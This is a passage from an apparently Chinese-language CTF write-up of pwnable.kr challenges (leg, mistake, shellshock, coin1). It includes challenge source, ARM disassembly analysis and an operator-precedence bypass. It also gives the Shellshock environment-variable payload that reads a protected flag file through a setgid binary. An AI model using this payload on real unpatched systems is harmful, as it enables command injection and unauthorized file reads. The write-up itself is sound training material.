</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=leg>leg</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=kt>int</span> <span class=nf>key1</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>	<span class=k>asm</span><span class=p>(</span><span class=s>&#34;mov r3, pc</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>key2</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>	<span class=k>asm</span><span class=p>(</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;push	{r6}</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;add	r6, pc, $1</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;bx	r6</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;.code   16</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;mov	r3, pc</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;add	r3, $0x4</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;push	{r3}</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;pop	{pc}</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;.code	32</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;pop	{r6}</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>	<span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>key3</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>	<span class=k>asm</span><span class=p>(</span><span class=s>&#34;mov r3, lr</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>key</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Daddy has very strong arm! :&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>key</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>((</span><span class=n>key1</span><span class=p>()</span><span class=o>+</span><span class=n>key2</span><span class=p>()</span><span class=o>+</span><span class=n>key3</span><span class=p>())</span> <span class=o>==</span> <span class=n>key</span> <span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Congratz!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=s>&#34;flag&#34;</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span>
</span></span><span class=line><span class=cl>		<span class=kt>int</span> <span class=n>r</span> <span class=o>=</span> <span class=n>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>write</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=n>r</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=n>printf</span><span class=p>(</span><span class=s>&#34;I have strong leg :P</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>同时，本题也给出了对应的 gdb 反汇编结果，显然是 arm 汇编指令。<a href=https://azeria-labs.com/writing-arm-assembly-part-1/ target=_blank rel="noopener noreffer">参考</a></p><p>arm 架构下：</p><ul><li>采用 RISC 指令集</li><li>pc 指向当前执行指令地址 + 8 处</li><li>r0 保存返回值</li><li>r11 对应 ebp，r13 对应 esp</li><li>r15 即 pc，存储当前指令 + 8（thumb 模式下 + 4）的位置（即后两条指令）</li><li>arm 模式下指令长度 4 字节，thumb 模式下 2 字节</li><li>bx：带状态切换的跳转</li></ul><p>知道了这些后，逐函数查看，先是 key1：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>(gdb) disass key1
</span></span><span class=line><span class=cl>Dump of assembler code for function key1:
</span></span><span class=line><span class=cl>   0x00008cd4 &lt;+0&gt;:	push	{r11}		; (str r11, [sp, #-4]!)
</span></span><span class=line><span class=cl>   0x00008cd8 &lt;+4&gt;:	add	r11, sp, #0
</span></span><span class=line><span class=cl>   0x00008cdc &lt;+8&gt;:	mov	r3, pc
</span></span><span class=line><span class=cl>   0x00008ce0 &lt;+12&gt;:	mov	r0, r3
</span></span><span class=line><span class=cl>   0x00008ce4 &lt;+16&gt;:	sub	sp, r11, #0
</span></span><span class=line><span class=cl>   0x00008ce8 &lt;+20&gt;:	pop	{r11}		; (ldr r11, [sp], #4)
</span></span><span class=line><span class=cl>   0x00008cec &lt;+24&gt;:	bx	lr
</span></span><span class=line><span class=cl>End of assembler dump.
</span></span></code></pre></td></tr></table></div></div><p>前两句和后三句是 arm 的函数入栈出栈返回操作，中间给 r3 赋值 <code>0x00008ce4</code> 并返回。</p><p>key2：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>(gdb) disass key2
</span></span><span class=line><span class=cl>Dump of assembler code for function key2:
</span></span><span class=line><span class=cl>   0x00008cf0 &lt;+0&gt;:	push	{r11}		; (str r11, [sp, #-4]!)
</span></span><span class=line><span class=cl>   0x00008cf4 &lt;+4&gt;:	add	r11, sp, #0
</span></span><span class=line><span class=cl>   0x00008cf8 &lt;+8&gt;:	push	{r6}		; (str r6, [sp, #-4]!)
</span></span><span class=line><span class=cl>   0x00008cfc &lt;+12&gt;:	add	r6, pc, #1
</span></span><span class=line><span class=cl>   0x00008d00 &lt;+16&gt;:	bx	r6
</span></span><span class=line><span class=cl>   0x00008d04 &lt;+20&gt;:	mov	r3, pc
</span></span><span class=line><span class=cl>   0x00008d06 &lt;+22&gt;:	adds	r3, #4
</span></span><span class=line><span class=cl>   0x00008d08 &lt;+24&gt;:	push	{r3}
</span></span><span class=line><span class=cl>   0x00008d0a &lt;+26&gt;:	pop	{pc}
</span></span><span class=line><span class=cl>   0x00008d0c &lt;+28&gt;:	pop	{r6}		; (ldr r6, [sp], #4)
</span></span><span class=line><span class=cl>   0x00008d10 &lt;+32&gt;:	mov	r0, r3
</span></span><span class=line><span class=cl>   0x00008d14 &lt;+36&gt;:	sub	sp, r11, #0
</span></span><span class=line><span class=cl>   0x00008d18 &lt;+40&gt;:	pop	{r11}		; (ldr r11, [sp], #4)
</span></span><span class=line><span class=cl>   0x00008d1c &lt;+44&gt;:	bx	lr
</span></span><span class=line><span class=cl>End of assembler dump.
</span></span></code></pre></td></tr></table></div></div><p>第三行保存 r6，第四行 r6 变成 <code>0x00008d05</code>，第五行进行带状态切换的跳转，由于 r6 最低位为 1，切换为 thumb 模式并跳转到 <code>0x00008d04</code>，也就是第六行。</p><p>第六行，由于处于 thumb 模式，pc 指向当前指令 + 4 的位置，r3 变成 <code>0x00008d08</code>。第七行 r3+4 变成 <code>0x0008d0c</code>，这就是最终的返回值。</p><p>key3：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>(gdb) disass key3
</span></span><span class=line><span class=cl>Dump of assembler code for function key3:
</span></span><span class=line><span class=cl>   0x00008d20 &lt;+0&gt;:	push	{r11}		; (str r11, [sp, #-4]!)
</span></span><span class=line><span class=cl>   0x00008d24 &lt;+4&gt;:	add	r11, sp, #0
</span></span><span class=line><span class=cl>   0x00008d28 &lt;+8&gt;:	mov	r3, lr
</span></span><span class=line><span class=cl>   0x00008d2c &lt;+12&gt;:	mov	r0, r3
</span></span><span class=line><span class=cl>   0x00008d30 &lt;+16&gt;:	sub	sp, r11, #0
</span></span><span class=line><span class=cl>   0x00008d34 &lt;+20&gt;:	pop	{r11}		; (ldr r11, [sp], #4)
</span></span><span class=line><span class=cl>   0x00008d38 &lt;+24&gt;:	bx	lr
</span></span><span class=line><span class=cl>End of assembler dump.
</span></span><span class=line><span class=cl>(gdb)
</span></span></code></pre></td></tr></table></div></div><p>这里将 lr 赋值给 r3，然后 r3 作为返回值。而 lr 相当于 <code>return address</code>，需要我们回到 main 里去看相关调用：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>   0x00008d64 &lt;+40&gt;:	bl	0xfbd8 &lt;__isoc99_scanf&gt;
</span></span><span class=line><span class=cl>   0x00008d68 &lt;+44&gt;:	bl	0x8cd4 &lt;key1&gt;
</span></span><span class=line><span class=cl>   0x00008d6c &lt;+48&gt;:	mov	r4, r0
</span></span><span class=line><span class=cl>   0x00008d70 &lt;+52&gt;:	bl	0x8cf0 &lt;key2&gt;
</span></span><span class=line><span class=cl>   0x00008d74 &lt;+56&gt;:	mov	r3, r0
</span></span><span class=line><span class=cl>   0x00008d78 &lt;+60&gt;:	add	r4, r4, r3
</span></span><span class=line><span class=cl>   0x00008d7c &lt;+64&gt;:	bl	0x8d20 &lt;key3&gt;
</span></span><span class=line><span class=cl>   0x00008d80 &lt;+68&gt;:	mov	r3, r0
</span></span><span class=line><span class=cl>   0x00008d84 &lt;+72&gt;:	add	r2, r4, r3
</span></span><span class=line><span class=cl>...
</span></span></code></pre></td></tr></table></div></div><p>可以看到这里进行了 <code>bl 0x8d20</code> 来调用 <code>key3</code> 函数，指令位于 <code>0x00008d7c</code>，那么此时返回地址应该是它的下一条指令所在地址，也就是 <code>0x00008d80</code>。</p><p>至此我们已经拿到了 3 个 key，相加得到 <code>108400</code>，输入即可。</p><p>精简指令集的确精简。</p><h2 id=mistake>mistake</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define PW_LEN 10
</span></span></span><span class=line><span class=cl><span class=cp>#define XORKEY 1
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>xor</span><span class=p>(</span><span class=kt>char</span><span class=o>*</span> <span class=n>s</span><span class=p>,</span> <span class=kt>int</span> <span class=n>len</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span><span class=p>(</span><span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span><span class=o>&lt;</span><span class=n>len</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=n>s</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^=</span> <span class=n>XORKEY</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[]){</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>fd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>fd</span><span class=o>=</span><span class=n>open</span><span class=p>(</span><span class=s>&#34;/home/mistake/password&#34;</span><span class=p>,</span><span class=n>O_RDONLY</span><span class=p>,</span><span class=mo>0400</span><span class=p>)</span> <span class=o>&lt;</span><span class=mi>0</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=n>printf</span><span class=p>(</span><span class=s>&#34;can&#39;t open password %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;do not bruteforce...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>sleep</span><span class=p>(</span><span class=n>time</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>%</span><span class=mi>20</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=n>pw_buf</span><span class=p>[</span><span class=n>PW_LEN</span><span class=o>+</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>len</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=n>len</span><span class=o>=</span><span class=n>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span><span class=n>pw_buf</span><span class=p>,</span><span class=n>PW_LEN</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>                <span class=n>printf</span><span class=p>(</span><span class=s>&#34;read error</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=n>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=n>pw_buf2</span><span class=p>[</span><span class=n>PW_LEN</span><span class=o>+</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;input password :&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>scanf</span><span class=p>(</span><span class=s>&#34;%10s&#34;</span><span class=p>,</span> <span class=n>pw_buf2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// xor your input
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>xor</span><span class=p>(</span><span class=n>pw_buf2</span><span class=p>,</span> <span class=mi>10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=n>strncmp</span><span class=p>(</span><span class=n>pw_buf</span><span class=p>,</span> <span class=n>pw_buf2</span><span class=p>,</span> <span class=n>PW_LEN</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>                <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Password OK</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=n>system</span><span class=p>(</span><span class=s>&#34;/bin/cat flag</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Wrong Password</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>注意到 <code>XORKEY</code> 为 1，也就是说 <code>xor</code> 函数只是把字符串的每个字符最低位翻转了一下。此外我们还知道输入的密码和文件中密码都是 10 字节，但我们读取不了后者。</p><p>回到题目提示，说和运算符优先级有关，回代码里看看也只有 <code>fd=open("/home/mistake/password",O_RDONLY,0400) &lt; 0</code> 可能出问题了，这里会先进行小于号比较，再将结果，一个布尔值，赋值给 <code>fd</code>。如果文件正常打开，那么 <code>fd</code> 应该为 <code>false</code> 也就是 <code>0</code>，这就是标准输入流的 fd，换句话说这个 pw_buf 的内容也是我们可以控制的。</p><p>之后就容易了，标准输入里输入十个 <code>b</code>，然后提示 <code>input password:</code> 时输入十个 <code>c</code> 使得异或结果正确即可。</p><h2 id=shellshock>shellshock</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=kt>int</span> <span class=nf>main</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=n>setresuid</span><span class=p>(</span><span class=n>getegid</span><span class=p>(),</span> <span class=n>getegid</span><span class=p>(),</span> <span class=n>getegid</span><span class=p>());</span>
</span></span><span class=line><span class=cl>        <span class=n>setresgid</span><span class=p>(</span><span class=n>getegid</span><span class=p>(),</span> <span class=n>getegid</span><span class=p>(),</span> <span class=n>getegid</span><span class=p>());</span>
</span></span><span class=line><span class=cl>        <span class=n>system</span><span class=p>(</span><span class=s>&#34;/home/shellshock/bash -c&#39;echo shock_me&#39;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>我们需要结合 <code>ls -al</code> 的结果来分析代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>drwxr-x---   <span class=m>5</span> root shellshock       <span class=m>4096</span> Oct <span class=m>23</span>  <span class=m>2016</span> .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>114</span> root root             <span class=m>4096</span> May <span class=m>19</span> 15:59 ..
</span></span><span class=line><span class=cl>-r-xr-xr-x   <span class=m>1</span> root shellshock     <span class=m>959120</span> Oct <span class=m>12</span>  <span class=m>2014</span> bash
</span></span><span class=line><span class=cl>d---------   <span class=m>2</span> root root             <span class=m>4096</span> Oct <span class=m>12</span>  <span class=m>2014</span> .bash_history
</span></span><span class=line><span class=cl>-r--r-----   <span class=m>1</span> root shellshock_pwn     <span class=m>47</span> Oct <span class=m>12</span>  <span class=m>2014</span> flag
</span></span><span class=line><span class=cl>dr-xr-xr-x   <span class=m>2</span> root root             <span class=m>4096</span> Oct <span class=m>12</span>  <span class=m>2014</span> .irssi
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> root root             <span class=m>4096</span> Oct <span class=m>23</span>  <span class=m>2016</span> .pwntools-cache
</span></span><span class=line><span class=cl>-r-xr-sr-x   <span class=m>1</span> root shellshock_pwn   <span class=m>8547</span> Oct <span class=m>12</span>  <span class=m>2014</span> shellshock
</span></span><span class=line><span class=cl>-r--r--r--   <span class=m>1</span> root root              <span class=m>188</span> Oct <span class=m>12</span>  <span class=m>2014</span> shellshock.c
</span></span></code></pre></td></tr></table></div></div><p>可以看到我们对 <code>flag</code> 文件没有任何权限，但是 <code>shellshock_pwn</code> 组的用户可以读 <code>flag</code>。回到代码中，将 <code>uid</code> 和 <code>gid</code> 设成 <code>egid</code> 后，程序已经拥有了 <code>shellshock_pwn</code> 组的权限，可以读到 <code>flag</code> 了，只是并没有读 <code>flag</code> 的代码。</p><p>联系题目提示，我们可以利用 bash 的 <a href=https://www.freebuf.com/news/48331.html target=_blank rel="noopener noreffer">ShellShock 漏洞</a>，具体原理可以参考链接中的文章。输入 payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ <span class=nb>export</span> <span class=nv>foo</span><span class=o>=</span><span class=s1>&#39;() {:;}; /bin/cat flag&#39;</span>
</span></span><span class=line><span class=cl>$ ./shellshock
</span></span></code></pre></td></tr></table></div></div><h2 id=coin1>coin1</h2><p>找假币问题，在 N 个硬币中最多花 C 次来找到唯一的一个较轻的假币，需要在 30 秒内完成 100 次游戏。最经典的解法就是二分，每次称一半，如果重量不是 10 的倍数则其中必定有假币，否则假币在另一半中，这样最多需要 <code>log(2, n)</code> 次就能找出假币。需要注意的是，由于网络延迟的关系，最好是在 pwnable.kr 的机器上运行脚本。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;localhost&#39;</span><span class=p>,</span> <span class=mi>9007</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ret</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>sleep</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>ret</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=n>N</span> <span class=o>=</span> <span class=n>ret</span><span class=p>[</span><span class=n>ret</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s2>&#34;N=&#34;</span><span class=p>)</span><span class=o>+</span><span class=mi>2</span><span class=p>:</span><span class=n>ret</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s2>&#34; &#34;</span><span class=p>)]</span>
